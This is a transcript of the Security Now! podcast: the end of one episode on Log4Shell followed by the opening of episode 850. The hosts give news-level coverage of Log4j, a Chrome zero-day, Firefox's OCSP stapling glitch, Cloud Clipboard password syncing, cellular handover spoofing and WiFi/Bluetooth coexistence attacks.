LEO:  Yeah.  Oh, shoot, I can't find it now.  But I'll find it, and I'll show you when I do.  Continue.  Continue on.



STEVE:  Okay.  Okay.  So now we all know exactly what's going on.  A default data logging component that's deeply embedded into pervasively used JAVA-based open source software has been found to contain an incredibly dangerous and readily exploitable feature which allows remotely located attackers to cause the execution of any code they design on a target's system.  And because this is deliberately universal cross-platform JAVA code, its opportunity for exploitation is also universal and cross-platform.



Moreover, since various Internet directory lookup queries, such as DNS and LDAP, can be induced remotely in vulnerable servers, this vulnerability and its weak mitigations, such as simple string match filtering, can be relentlessly and remotely probed for weaknesses and workarounds.  That is to say, if a bad guy is able to get through, they immediately get the reward of knowing so.  So we will doubtless be discussing clever new ways which are being found to access this design flaw in the future, I guess design and configuration flaw in the future.  



LEO:  This is from Canary's own site.  Probably easiest to go there.  But you could use a Canary token to test, and they have a walkthrough on there.  Which is probably no easier or harder than using the link that you showed, but it's just a way to do it with your Canary token.  So that's cool.



STEVE:  Cool.



LEO:  Yeah.



STEVE:  So we know how this story is going to go, right, though with perhaps significantly more punch this time than in previous stories.  The Internet is packed with systems, and enterprises are packed with systems that are not being dynamically and proactively maintained.  They will all be found by the bad guys, if they haven't been already.  And they will be taken over.



I have one more important GRC shortcut to share, and that's grc.sc/log4shell.  This redirects to a very actively maintained GitHub page of alphabetically sorted, presently known, software vulnerability status, both good and bad.  Depending upon your and your company's online status and your use of JAVA-based infrastructure, that page may be worth keeping an eye on.  Again, grc.sc/log4shell takes you to this GitHub page.  You could scroll down a little bit, Leo.  You'll find an index of four links, and you want the - I think the fourth one, the software, or, yeah, software, fourth one down, yeah.  And so now there's a long, look how tiny the scroll thumb is on your page, it is a super-long page. 



LEO:  Wow.  So much.  Oh, my god.



STEVE:  Yup, I know.



LEO:  So much is vulnerable.



STEVE:  It is just a disaster.



LEO:  You know what's sad is all of these people using this are dependent basically on an open source program maintained by volunteers.



STEVE:  Yup.



LEO:  And relying on volunteers to fix it.  You know, if you have a commercial enterprise relying on this, maybe help them out a little bit.



STEVE:  Yup, provide some support.



LEO:  Kick in some money or something.  These guys are busting their butts for free for your commercial enterprise.



STEVE:  Yeah, I saw on Sunday you showed that wonderful stacked blocks picture that we showed on our Picture of the Week... 



LEO:  Yeah, xkcd, yeah.



STEVE:  ...some time ago where this huge constructed edifice is, like, all hinged on one little piece that's maintained by some guy in his mother's basement in Nebraska and, like, the world depends upon it.



LEO:  Yeah.



STEVE:  And, yeah, unfortunately that's the strange world that we have built for ourselves.  That and holding nobody responsible for these earthshaking catastrophes.



LEO:  Ah.  Well, Steve, I've been waiting for this show since Thursday.  I'm glad to get all the insight that you can offer.  That's why we love Security Now!.  If you love Security Now!, a couple of ways you can participate.  Of course Steve has his own site, which is kind of Security Now! Central, GRC.com.  Security Now! is there, 16Kb audio, 64Kb audio, really nice transcripts from Elaine Farris.  And of course Steve's show notes.  They're all there at GRC.com.  You can leave him feedback at GRC.com/feedback.  That's also where you'll find SpinRite, the world's finest mass storage maintenance and recovery utility, now 6.0, soon to be 6.1.  Participate in the development and get a free upgrade if you buy now.  GRC.com.



He's also on the Twitters, @SGgrc.  And you can leave him a DM there if you have a comment or a Picture of the Week or anything you'd like to add.  @SGgrc.  We have versions of this show on our website, TWiT.tv/sn, 64Kb audio.  We also have video if you like to watch Steve think while he drinks.  You can also get the show on YouTube.  There's a dedicated YouTube channel for Security Now!.  Or subscribe in your favorite podcast application.  You'll get it that way automatically, as well.  And if you do subscribe in a podcast app, make sure you leave a five-star review.  Tell the world about the great national resource represented by Steve Gibson of Security Now!.



We do the show every Tuesday at about 1:30 to 2:00 p.m. Pacific, 5:00 p.m. Eastern, 22:00 UTC.  You can watch us do it live at live.twit.tv.  Chat with us at irc.twit.tv.  Steve, have a great week, and I'll see you next time on Security Now!.



STEVE:  Will do.  We'll be back next week for the last show of the year.  Yay.  I mean, not yay.  I mean, not.



LEO:  Well, this year could be over.  That'd be okay with me.  And our best-of is coming up, too, this month.  So that'll be fun.  Thanks, Steve.



STEVE:  Okay, buddy.  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#850

DATE:		December 21, 2021

TITLE:		It's a Log4j Christmas

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-850.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  There was no way that a massively widespread vulnerability in Java with a CVSS score of 10.0 would be wrapped up in a week.  So this week we'll look at the further consequences of the Log4j vulnerabilities, including the two additional updates the Apache group have since released.  But before that we'll look at what will hopefully be Chrome's final zero-day patch of the year, Firefox's surprise refusal to take its users to Microsoft.com, and Mozilla's decision to protect its users from Windows 10 cloud-based clipboard sharing.  We have a new and interesting means of increasing the power of fraudulent cell tower Stingray attacks, and a continuing threat from cross-radio WiFi-to-Bluetooth leakage.  We'll touch on a sci-fi reminder and a SpinRite update, then dig into what's happened since last week on the Log4j front.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We have yes, of course, more on Log4j, the worst security exploit of all time.  At least that's what I'm thinking as Steve continues to describe how bad it is.  Yet another, let's hope it's the last, zero-day for Chrome.  Yes, they're going to fix it.  And clipboard in the cloud?  What could possible go wrong?  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 850, recorded Tuesday, December 21st, 2021:  It's a Log4j Christmas.



It's time for Security Now!.  Yes, indeed.  We're going to soon rename this to The Log4Shell Show.  Steve Gibson is here.  He's the Security Officer in Chief.  Hello, Steve.



STEVE GIBSON:  Hello, Leo.  That's an unofficial title, by the way.



LEO:  I just gave it to you.  	



STEVE:  But I do respond to that, so that's fine.



LEO:  Yes.  Yes.



STEVE:  This is Episode 850.  And it's like, wow.



LEO:  Oh.  That's remarkable.



STEVE:  That makes the math really easy because it means we've got 150 left, and then...



LEO:  Why do you keep bringing that up?  You're going to make me cry, dude.  You're going to make me cry.



STEVE:  Well, that's going to be - that's three years, Leo.  That really should do it.  I think Log4j will finally be resolved.  Oh, actually there are some opinions about that.  We'll be talking about that, about the depths to which this thing has been submerged into our Java libraries.  But the other nice number is 122121, which is today, which I guess means Christmas is not far off.



LEO:  Not far away.



STEVE:  I should go get some wrapping paper.  Anyway...



LEO:  Yes, me, too.  First get presents to put in the wrapping paper, then wrapping paper.



STEVE:  But yes.  Today's title is "It's a Log4j Christmas."  And actually the CISA has forbidden any IT people to open any presents before they have fully remediated their federal enterprises of Log4j, which is nice to say.  I mean, you know, you can say it.  But it's not happening.  And we'll be talking about that because Google did some interesting analysis.  But of course there was no way that a massively widespread vulnerability in Java carrying a CVSS score of 10.0 could possibly have been wrapped up last week.  So this week we'll be looking at the further consequences of the Log4j vulnerabilities, including the two additional updates the Apache Group have since released as a consequence of more eyeballs looking at the code and going, oh.



LEO:  Hey.  You missed this.



STEVE:  What about this little problem over here?



LEO:  God.  Oh, my god.



STEVE:  But before that we're going to look at what will hopefully be Chrome's final zero-day patch of the year;  Firefox's surprising refusal last week to take its users over to Microsoft.com - what?; and Mozilla's decision to protect its users from Windows 10 cloud-based clipboard sharing.  Cloud-based clipboard sharing, you know, that just - you don't even have to wonder what could possibly go wrong with that.



LEO:  Yeah, yeah, yeah, yeah, yeah.



STEVE:  Oh.  We have a new and interesting means of increasing the power of fraudulent cell tower Stingray attacks, and a continuing threat from cross-radio WiFi-to-Bluetooth leakage within our handsets.  I want to touch briefly on a sci-fi reminder about what's happening tomorrow.  I'll be on the couch with popcorn.  And I've got a SpinRite update, and that's actually - Lorrie and I will both be on the couch with sore shoulders because we have a 9:00 a.m. appointment in the morning.



LEO:  Oh, good for you.  Yay.



STEVE:  To boost ourselves.



LEO:  Yeah.



STEVE:  For a while we were thinking, well, actually I was wanting to wait to see if Omicron would produce some change.  And I was gratified to hear in the background one of the talking heads saying that, although Moderna is looking at an altered booster, one of the consequences of Omicron appears to be the booster fall-off is much more rapid than it was with Delta.  It's providing on the order of only a few months of protection against Omicron as opposed to...



LEO:  I'm going to start getting a monthly shot, I said.  Whatever it takes; you know?



STEVE:  What a mess, yeah.



LEO:  What a mess.



STEVE:  Anyway, so the sci-fi reminder, an update on some interesting stuff that has happened within my SpinRite world this past week, and then we're going to dig into everything that's happened in the previous week on the Log4j front.



LEO:  Oh, so much.



STEVE:  So I think a final podcast, not forever, just of the year.  We've got three more to go at least.



LEO:  Actually I want to, while I'm doing this ad, point you to - you probably read it, the Project Zero analysis of how the Pegasus exploit got around Apple's Blaster.  Have you read it yet?



STEVE:  Oh, I did not read that, no.



LEO:  Oh, my god, you will get such a kick out of it because essentially the way it worked was, as you know, it's these rendering engines that are always the flaws.



STEVE:  Oh, it's an interpreter.



LEO:  And the PDF rendering engine that they use for Apple's messages is an old open source Xpdf program.  And it turns out it's got a buffer overflow, a little integer overflow.  These things happen.  And but the bad guys, I guess the NSO group, figured out that by pretending that a GIF file was a GIF file and actually making a PDF would trigger the PDF renderer, and then they could trigger the overflow.  And then they discovered that you could in effect put four logic gates in a random location in memory:  an AND gate, an OR gate - AND gate, OR gate, XOR, and there's one more, another OR.



STEVE:  NOR.



LEO:  NOR, yes, I think it's an XNOR or something like that.  But with those four they could make a Turing-complete system.  They basically built an operating system and code rendering engine that gave them registers, it gave them comparators, gave them everything.



STEVE:  Oh, my lord.



LEO:  You know, if it weren't so evil, it's really a work of genius.  It's amazing.



STEVE:  Yeah.  So you're saying that they located four locations where they could get that work done.



LEO:  Exactly.



STEVE:  And then they knit those locations together.



LEO:  Exactly.  Exactly.



STEVE:  In order to create basically pseudocode out of those.



LEO:  Yes.  Yes.  It's brilliant.



STEVE:  Wow.



LEO:  It's a two-parter the Project Zero team put up at Google Project Zero to Blogspot.com.  And the second part is not out yet.  But I think you will - be good Christmas Eve reading.  Maybe you and Lorrie can gather 'round the fire, and you can read it out loud.  I think...



STEVE:  Well, and if there's any more surprises that haven't already been given away, maybe it's our first podcast of the new year.  Sounds like it would be...



LEO:  It's be a - I would love to hear you talk about this, yes.



STEVE:  This one nominally has a Christmas theme since it's about wrapping things.  We have Uncle Sam in his flag-theme stovepipe hat.  And he's apparently bringing to the table to be wrapped a box.  On one edge it says "U.S. Gov't."  And then proudly in the front it says "Control of End-to-End Encryption."  And so that's got to get wrapped.  And we have a corporate media schmo who in the talk bubble is asking Uncle Sam, "How would you like this wrapped?"  And then against the back wall we see two rolls of wrapping paper, one titled "Anti-Terrorism" and the other "Protect the Kids."



LEO:  There should be a third.  "Think of the Women."  I guess that's out of date now, but yeah.



STEVE:  Oh, yeah, that's right.  How are we going to sell this sucker?



Okay.  So early last week Google pushed an emergency Chrome update to resolve the 16th in-the-wild zero-day being actively used in attacks against its users.  By this time, and even in this case I, which surprised me, it's like, oh, good, I don't have to ask for it, everyone using Chrome on Windows, Mac, or Linux desktops should be at 96.0.4664.110.  That eliminates a high-severity, once again, use-after-free flaw, which really seems to be the, like, they're all over the place in Chrome.  This is in Chrome's V8 JavaScript engine which someone had found and was using.  And as usual, because it's Google, that's all we know about it, since Google has no motivation, no need or reason to share anything more.  Like, why would they?  What good's that going to do?



They wrote:  "Google is aware of reports that an exploit for CVE-2021-4102 exists in the wild."  And they thanked an anonymous security researcher for their report which allowed them to fix this.  And since we're wrapping up the year in this week's podcast, we've got one more to hold our breath after this, we'll note that along with Chrome's extreme popularity comes a big bulls-eye painted on it since the bad guys get the most bang for their buck by attacking the market-leading web browser, and thus all of its many users.



Chrome had its first zero-day flaw patched at the start of February, then two in March, another two in April, one in May.  June offered us a pair.  July had only one.  September kept the patchers very busy by closing five zero-days just here in this past September.  October had one.  November snuck past without any.  And assuming that we're able to close out the year without any others, December will have brought us the 16th and final...



LEO:  Geez.  Good lord.



STEVE:  ...zero-day, I know, for 2021.  And as I've noted before, I don't think this means anything about Chrome other than it's receiving more than its fair share of scrutiny.  One of the best models I think this podcast has developed for security is this idea of porosity.  Complex software security barriers are just - they're not secure.  There's no other way to read the last 17 years of this podcast's evidence.  You know, we haven't figured out how to do that yet.  Or at least we haven't made it a priority, probably because it doesn't seem to really be such a big problem.  You know?  Other people are being attacked.



So, okay.  But if our software security barriers are not absolutely secure, then what are they?  You know?  They resist penetration, though imperfectly.  And this is why I'm enamored of the idea that our barriers are porous.  The more pressure the bad guys place against a barrier, the more problems sneak through.  And the closer we look at our software, the more problems we find.  There was only one known problem with Log4j before researchers began staring at it closely for the first time ever, which revealed two additional, or three depending upon how you count, new problems.  And we'll be talking about those developments at the end of the podcast.  None of those was quite as bad as the first, but all needing fixing.  One got a 9.0, which is pretty high up there.  And the same thing, as we know, happened with Microsoft's ill-fated Exchange Server and Windows Printing throughout all of 2021.



And this is why, of course, there's money to be made from bug bounties. Companies will pay to learn of problems in their own software.  Their own people should have found them, or never created those problems in the first place.  But like I said, we don't really seem to care enough to prevent them.  So there's revenue available for anyone who enjoys looking at code.  And speaking of looking at code, there is absolutely, and I know you'll agree with this, Leo, no better way to improve one's own coding skill than by reading the work of other coders.



LEO:  Oh, yeah.  Absolutely.



STEVE:  Anyone who hasn't will be stunned by how much you can learn by looking at the way other people have solved problems.  It's, I mean, you could spend half your life, if you were like really into coding, reading other people's code and saying, hey, I didn't know you could do that.  That's really cool.



LEO:  Yeah, yeah, yeah, yup, exactly right, yup.



STEVE:  Yeah, it just happens.  And I think that's, for you and me, that's why we are so passionate about code is that it is so big.  It is so open-ended.  It is, you know, it can ask as much from you as you're willing to give it.  So anyway, as for browser vulnerabilities, there's currently a lot to be annoyed with Microsoft about.  But I just want to say again, because we talked about this over the last couple weeks, that that idea they had of backing off of Chromium's extreme optimization in order to reduce the browser's attack surface at the minimal cost of what is probably unneeded performance gain, I really think that's quite compelling.  That's one that I hope Microsoft ends up proving and backports into the Chromium build and maybe gives to Chrome users and other users of the Chromium engine.  I think that seems like a real win.



Okay, now, get a load of this one.  I encountered it, too.  Firefox had a bit of an adventure last week when it began refusing to connect to Microsoft.com.  And I don't recall now what had me going to Microsoft.com.  I don't go often.  But I encountered the error myself, and it caused quite a stir online.



Now, back in the early days of this podcast we discussed the many problems surrounding web server certificate revocation.  In fact, it got to be a hobbyhorse of mine.  I created revoked.grc.com just to demonstrate how poorly browsers were handling revoked certificates by like putting one there and saying, look, your browser doesn't know it's been revoked.  It's been revoked a long time.  No one cares.



So what happens is certificates expired only - and in the old days, you could get five years, or three for some.  Of course that keeps getting whittled down as a means of still trying to deal with this problem of stale certificates that might have gotten out of someone's control.  So one of the solutions to the problem of erroneously trusting a revoked certificate was to have the web browser perform, that is, the user's web browser perform an on-the-fly query of the certificate issuer's OCSP server, where OCSP stands for Online Certificate Status Protocol.  So in this way a real-time verification of the current validity of an identity certificate which had just been received from a remote web server could be verified by the browser client.



Now, the problem with this is that it takes time to do that.  And back when OCSP was still young, OCSP servers were often overloaded or sometimes unresponsive.  And the last thing a browser wanted to do was to slow down its users.  There's no faster way to lose your user base than to be a slow browser.  So OCSP was often set, kind of uselessly, to "fail open," meaning that only if an affirmative negative response came back would the site be blocked.  Either an affirmative positive response or no response at all would let the user keep using that site.  And the problem was that the bad guys who may have stolen someone else's valid certificate might arrange to block a negative OCSP response from getting back to its user, thus causing their browser to erroneously trust a fraudulent website.



Okay.  So the concept of "stapling" was introduced, which I just think is brilliant.  With stapling, rather than asking the user's web browser to go get an OCSP attestation, as they're referred to, the web server itself, the web server itself could periodically obtain a recently signed and timestamped assertion from its own certificate authority to accompany the certificate it was providing to browsers.  And it would, and this was the term, "staple" that new fresh assurance to its own multiyear lifelong identity certificate.  The stapled OCSP attestations would only be valid for a short time, perhaps just a few hours, so the web server would periodically reach out to renew this attestation that it was stapling to all of its outgoing certificates well before they would expire.



And the final bit of perfection comes from the web server's certificate having a flag known as "OCSP Must Staple" set.  This completes and locks down the system by affirmatively telling any browser that receives this certificate that it is only to be considered valid, that is, the certificate itself is only to be considered valid if it also is accompanied by a valid, recently signed, stapled OCSP certificate.  So that measure protects the certificate holder from the theft of their certificate.  If it were found to be stolen, it could be immediately revoked by its original issuer, who would then refuse to issue any further valid OCSP certificates for stapling.  And since by design all OCSP certificates expire quickly, the stolen certificate would quickly become useless because the certificate itself said this certificate must be accompanied by a valid stapled OCSP attestation.



So what happened?  Last week, with this wonderful system having long been in place at Microsoft, and everything going along swimmingly, the now outdated SHA-1 signature was silently dropped from the Certificate ID fields present in Microsoft's OCSP certificates.  And apparently no one else has done this.  Microsoft led the charge.  Since the newer SHA-256 signature hash was still present, Safari and Chrome had no complaint and didn't even notice the change, nor did their users.  But somehow Firefox had never enabled their browser's support for SHA-256 hashes in OCSP stapled certs.  The code was in there and ready to go, but someone forgot to turn it on.



So around the middle of last week, Firefox began refusing to allow any of its users to connect to most of Microsoft's various domains, including Microsoft.com itself.  The server's certs were flagged, as I said, as "OCSP Must Staple," but from Firefox's vantage point the stapled certs appeared to be unsigned and thus invalid.  So Firefox properly, kind of, refused to allow its users to go any further.



Fortunately, the problem was quickly remedied.  As I said, it was a matter of turning it on and pushing out an update.  Last Thursday's December 16th release of Firefox 95.0.1 fixed this immediately.  Mozilla's bug number 1745600 is titled:  "Fixed frequent MOZILLA_PKIX_ERROR_OCSP_RESPONSE_FOR_CERT_MISSING error messages when trying to connect to various Microsoft.com domains."  So anyway, I just thought that was interesting.  It popped up on my Firefox; and I thought, oh, what do you know?  There's a problem with OCSP.  I didn't dig any further.  I didn't, like, look into turning it off or anything because, you know, I've got Chrome right next to it, so I just used Chrome to do whatever I had to do, and that worked, and I figured they'd sort things out, as they indeed did.



But anyway, just sort of interesting little misfire from, I mean, and this is - there is sort of a lesson here, right, which is it is certainly possible to tighten the screws down so much so that absolutely nothing will get past.  But boy, if you do that, you really need to make sure that all of the links in the chain are working correctly.  You know, I'm put in mind of the HSTS, the HTTP Strict Transport Security, where that's the header that you're able to add to your server that tells the browser, you've got a secure connection now.  And here's an expiration on how long we want you to remember that you should only get secure connections from this website.  And best practice is that you set that to infinity, essentially.  But if you do that, you'd better absolutely know that you're going to be able to have TLS certificates for the end of time.  Otherwise users are just not going to be able to get to your site.  So, yeah, again, neat that we have these technologies that allow us to tighten things down so much.  But you need to make sure they don't go wrong.



Okay.  Since we've talked about Firefox and Microsoft, here as I mentioned at the top was another one of those "what could possibly go wrong" features in Windows, which to their credit Mozilla has dealt with.  It's known that as, well, the feature is known as Windows Cloud Clipboard.  It was added to Windows 10 way back in September of 2018, back with Win10's 1809 release.  And it is what it sounds like, a feature that allows users to sync their local PC's clipboard histories to their Microsoft accounts.



Fortunately, what seems like an abuse-prone feature is disabled by default.  Yeah, and I mean that seriously.  You'll see.  But when enabled, it allows Windows users to access the Cloud Clipboard by pressing the Windows Key+V shortcut.  So instead of like, you know, CTRL+V for local paste, you do Windows+V for galactic cloud paste.  And this grants users access to clipboard data from all their other devices.  Again, as I said, what could possibly go wrong?  And more than that, the service also maintains a clipboard history, allowing users to go through past items they copied or cut and then repaste the same data into new contexts, whatever that might be.



So what recently came to light, and what Firefox fixed in last month's Firefox 94, remember just last week was 95.0.1 to fix this Microsoft.com mess.  So last month was Firefox 94.  What happened was they realized that usernames and passwords copied from the browser's password section were being recorded on demand, as with everything else, into this shared Cloud Clipboard repository with history.  So is that a bug, or is that a feature?  Either way, Mozilla decided it was not good.  And there's a workaround; right?  If you really want that, then copy it to Notepad, and then copy it from Notepad to the cloud.  But not directly.  Mozilla says no.  We don't want people to like, when you're just copying it for some reason from Mozilla, that should not be recorded in your permanent clipboard history shared by all your PCs.



So in a blog post last Wednesday, Mozilla said that with release 94 they've modified Firefox so that usernames and passwords copied from the browser's password section - you get to that with about:logins in the URL - will no longer be stored in the Windows Cloud Clipboard, but instead will be stored only locally, in a separate clipboard section.



Mozilla said it considered this behavior, that is, the normal behavior, dangerous - uh-huh - since any threat actor with access to a synced device could simply press the Windows+V keyboard combination and access any clipboard data from a user's past activity on other devices.  Now, I suppose that as long as a Windows power user understands the inherent danger, this clipboard cloud sharing could come in handy. But Mozilla felt that this was especially dangerous in the case of the exportation of the browser's stored usernames and passwords since no trails or local logs of any kind are retained.  So you wouldn't even see that this had happened.  Mozilla also said that they had added even more protection to their Private Browsing windows so that nothing copied from a Firefox private window would be synced to the Windows Cloud Clipboard, not just an exclusion for user credentials but everything.



And for what it's worth, be warned, no Chromium-based browsers include this protection, and usernames and passwords from Chrome were synced to Microsoft cloud servers when this feature was tested.  So users should be aware of who might access their passwords if they use the Cloud Clipboard, you know, if it's enabled, and are using any non-Firefox browser on Windows.  But as I said, even that is still some weak protection.  It's not that difficult to get around it, if you wanted to.  So, wow.  You know, the idea of synchronizing your clipboard to the cloud really has the feeling, Leo, like a feature in desperate search of need.



LEO:  You know, Apple has a sort of a similar thing which is if you copy something onto the clipboard on a Mac, it will then go to your phone.  But it doesn't go to the cloud.  It just goes to your phone.  Why put your clipboard in the cloud?  That seems like a - it does.  It's a selling point, it's not a...  



STEVE:  Yeah, and not just the last thing you pasted, but like...



LEO:  The whole thing.



STEVE:  ...your history.



LEO:  Yeah.  That's, you know, that's passwords.  That's everything.



STEVE:  Yeah.



LEO:  That's not a good idea.



STEVE:  Yeah.



LEO:  Obviously.  Just the name of it.



STEVE:  So turns out there is, not a huge weakness, but sort of an interesting problem which has existed in all cellular networks since 2G.  A paper was just published under the title  "Don't Hand It Over:  Vulnerabilities in the Handover Procedure of Cellular Communications."



Now, "handover" is the official name for what we normally call cellular inter-tower handoff.  It's the process by which, as we know, a phone call or a data session gets transferred from one cell site base station to another without losing any connectivity during the transmission.  And of course it was the key innovation of the whole cellular radio system, and a brilliant invention.  And of course it's crucial to establishing and maintaining cellular communications while the user's on the move so that you're driving along, and everything seems fine, yet your connection is being handed off from one cell tower along the side of the freeway to the next as you drive.



Okay.  So here's how this works in a little more detail which pertains to what has been the exploit that's been worked out.  The user's equipment, typically a handset, sends its received signal strength, that is, the signal strength it's receiving from multiple nearby towers to the network so that the network can determine whether a handoff is necessary and, if so, that network facilitates a switch between base stations when a more suitable target station is available or is soon to be available.  Although these signal readings are cryptographically protected, it turns out that the content of these reports is not verified.  And this lack of verification allows an attacker to spoof these reports and to thereby force a device to move to a cell site of their choosing, typically operated by an attacker.



So this attack arises because, as I said, these unverifiable signal strength reports are undetectable.  They're part of the system that was just, you know, in this long-established protocol this aspect was never properly designed to be spoof proof and has indeed been proven now not to be.  It doesn't create a huge new problem, but it does mean that the effectiveness of fake cell stations, often called Stingrays, can now be increased.  It used to be that a Stingray needed to be located in close proximity to its target so that it would have the stronger signal, and that the normal signal strength juggling process would cause the targeted user to switch their traffic over to the Stingray.



But this new research dramatically reduces this requirement.  So now any user within range can have their traffic rerouted through a man in the middle, which is what these Stingrays are typically used for.  It can be used as a denial of service if there's some benefit for, like, disconnecting someone from the cell system.  You can essentially commandeer their phone by switching it to a Stingray that doesn't proxy for the regular network as is normally done.



In the researchers' experimental setup, they found that all devices, they tested a OnePlus 6, an Apple iPhone 5 - that's an oldie - a Samsung S10 5G, a Huawei Pro P40 5G, and others.  Every one of them was susceptible to both a denial of service, meaning just cutting you off from the network, and man-in-the-middle attacks.  They presented their findings at the Annual Computer Security Applications Conference (ACSAC) earlier this month.



So again, it's not like any new big problem crack in cell coverage.  But literally everything from 2G all the way up through 5, there is no - and of course this is never going to change now; right?  You can't change this protocol.  It's too late.  All of the infrastructure is deployed.  All of the devices exist.  All you can do is know about it.  And maybe, certainly to the degree that now we're, in the case of data, we're encrypting our traffic before it goes over a cell connection, thanks to HTTPS, there's not much that a bad guy could do.



We already have, we already know that HTTPS itself is providing strong protection against any man-in-the-middle attacks.  You know, a denial of service would be a vulnerability that would be effective, although potentially less devastating.  But it might, you know, be used cleverly to get someone to move from where they are, trying to, you know, like can you hear me now?  Can you hear me now?  Who knows?  But anyway, the technology exists.  It's public.  And so given the way things are these days, we could expect it to be incorporated into next-gen Stingray systems before long.



Another thing that's not going to change, unfortunately, is protection against this next problem, which is cross-WiFi-to-Bluetooth leakage.  A team of German and Italian researchers have significantly updated their previous research.  A couple years ago they first, like, raised the alarm, actually it was at a Black Hat conference several summers ago, and no one really took that much notice of it.  The problem being, or the reason being probably is that it is not easy to fix.  So they updated their research regarding a class of what they call "coexistence attacks" against WiFi and Bluetooth.  Their research paper is titled "Attacks on Wireless Coexistence: Exploiting Cross-Technology Performance Features for Inter-Chip Privilege Escalation."



And the abstract of their paper explains what they've done.  They wrote:  "Modern mobile devices feature multiple wireless technologies such as Bluetooth, WiFi, and LTE."  You know, cellular.  They said:  "Each of them is implemented with a separate wireless chip, sometimes packaged as combo chips.  However, these chips share components and resources such as the same antenna or wireless spectrum.  Wireless coexistence interfaces enable them to schedule packets without collisions despite sharing these resources, which is essential to maximizing networking performance. 



"Today's hardwired coexistent interfaces hinder clear security boundaries and separation between chips and chip components."  They said:  "This paper shows practical coexistence attacks on Broadcom, Cypress, and Silicon Labs chips deployed in billions of devices. For example, we demonstrate," they said, "that a Bluetooth chip can directly extract network passwords" - meaning WiFi - "and manipulate traffic on a WiFi chip.  Coexistence attacks enable a novel type of lateral privilege escalation across chip boundaries.  We responsibly disclosed the vulnerabilities to the vendors, yet only partial fixes were released for existing hardware since wireless chips would need to be redesigned from the ground up to prevent the presented attacks on coexistence."  In other words, don't hold your breath.



Okay.  So to put some additional context to this, I want to share the top of their paper's introduction, which I think everyone will find interesting and, unfortunately, somewhat worrisome.  They explain:  "Wireless communication is enabled by Systems on a Chip (SoC), implementing technologies such as WiFi, Bluetooth, LTE, and 5G.  While SoCs are constantly optimized towards energy efficiency, high throughput, and low-latency communication, their security has not always been prioritized.  New exploits are published continuously.  Firmware patching to mitigate flaws requires strong collaboration between vendors and manufacturers, leading to asynchronous, incomplete, and slow patch cycles.  In addition, firmware patch diffing can provide attackers with Systems on a Chip vulnerabilities months before their public disclosure."  Not to speak of their actual installation into their users' phones, if that ever happens.



They said:  "Mobile device vendors account for potentially insecure wireless SoCs by isolating them from the mobile Operating System and hardening the OS against escalation strategies.  For example, on Android, the Bluetooth daemon residing on top of OS drivers runs with limited privileges, is sandboxed, and is currently being reimplemented in a memory-safe language.  As a result, recent wireless exploit chains targeting the mobile OS instead of the System on a Chip are rather complex and need to find a bypass for each mitigation."



They said:  "We provide empirical evidence that coexistence, i.e., the coordination of cross-technology wireless transmissions, is an unexplored attack surface.  Instead of escalating directly into the mobile OS, wireless chips can escalate their privileges into other wireless chips by exploiting the same mechanism they use to arbitrate their access to the resources they share, for example, the transmitting antenna and the wireless medium.  This new model of wireless system exploitation is comparable to well-known threats that occur when multiple threads or users are able to share resources like processors or memory.



"This paper demonstrates lateral privilege escalations from a Bluetooth chip to code execution on a WiFi chip.  The WiFi chip encrypts network traffic and holds the current WiFi credentials, thereby providing the attacker with further information.  Moreover, an attacker can execute code on a WiFi chip even if it is not connected to a wireless network.  In the opposite direction, we observe Bluetooth packet types from a WiFi chip.  This allows determining keystroke timings on Bluetooth keyboards, which can allow reconstructing texts entered on the keyboard."  And we've talked about keyboard timing attacks years ago, and they're real.  And surprisingly effective when you put enough AI behind the timing.



And they finish:  "Since wireless chips communicate directly through hardwired coexistence interfaces, the OS drivers cannot filter any events to prevent this novel attack.  Despite reporting the first security issues on these interfaces more than two years ago, the inter-chip interfaces remain vulnerable to most of our attacks."  They said:  "For instance, Bluetooth/WiFi code execution is still possible on iOS 14.7 and Android 11.  Wireless coexistence is indispensable for high-performance wireless transmissions on any modern device.  We experimentally confirm that these interfaces exist and are vulnerable today."  So maybe in 2022 we'll be talking a little bit about the mischief that has been leveraged, taking advantage of inter-radio leakage.



LEO:  Unfortunately, I think the mischief will be kind of mysterious because it's going to be things like those DC Stingrays that are going to get better, and nobody's going to know anything about it; right?



STEVE:  Yup.



LEO:  Right?  It's going to be kind of transparent.



STEVE:  Yup, yup.  Okay, so I said a brief sci-fi reminder.  And that's for "The Matrix Resurrections."  Yeah.



LEO:  I hope it's good.  Because 1 was great.  2 and 3 weren't so great.  You know what I'm saying?



STEVE:  I'm in complete agreement.  I'm in complete agreement.  It starts airing at like 3:00 a.m. or something in the morning tomorrow.  It's co-releasing, because it's Warner Bros. it's co-releasing in the theaters and on HBO Max.  And, you know, despite the fact that IMDB currently pegs it at a 6.8, which falls beneath my normal IMDB threshold of 7.0, I find that that's sort of about the level of pain, I'm quite certain that Lorrie and I, having received as I mentioned our vaccine boosters at 9:00 a.m. tomorrow morning, will be snuggled up on our couch.



LEO:  You won't be able to move.  So you'll be forced to watch "The Matrix."



STEVE:  We won't be able to move.  Yeah, and maybe we ought to be shot in different shoulders.



LEO:  Kind of like taking the red pill; you know? 



STEVE:  That way we could put the popcorn in between us.



LEO:  Yeah, yeah, one hand can move, the other one will just lie limp.



STEVE:  And Leo, I'm not expecting much, and I don't expect to be wowed or surprised.  Movies don't seem to be that much anymore.



LEO:  No.



STEVE:  You know?  There are a lot of special effects.



LEO:  I liked "Dune."  You liked "Dune"; right?  That was good.



STEVE:  That's true.  That is, but - yeah.  But it wasn't like <gasping>.  When have we had that?



LEO:  No, it's been a while.  It's mostly long-form TV shows really these days are the things we get excited about.



STEVE:  Yeah.



LEO:  I don't know.  I'll be interested.



STEVE:  Oh, I can't wait.  I just lost two and a half hours.  Goodbye.



LEO:  Yeah.  Yeah.  "Midnight Alley" - is that what it's called? - looks good, too.  Anyway, there are some good movies coming out this week, thank goodness.



STEVE:  And are they available without going to a theater?



LEO:  Yes, yes, yes.  Because I ain't going to no theaters.



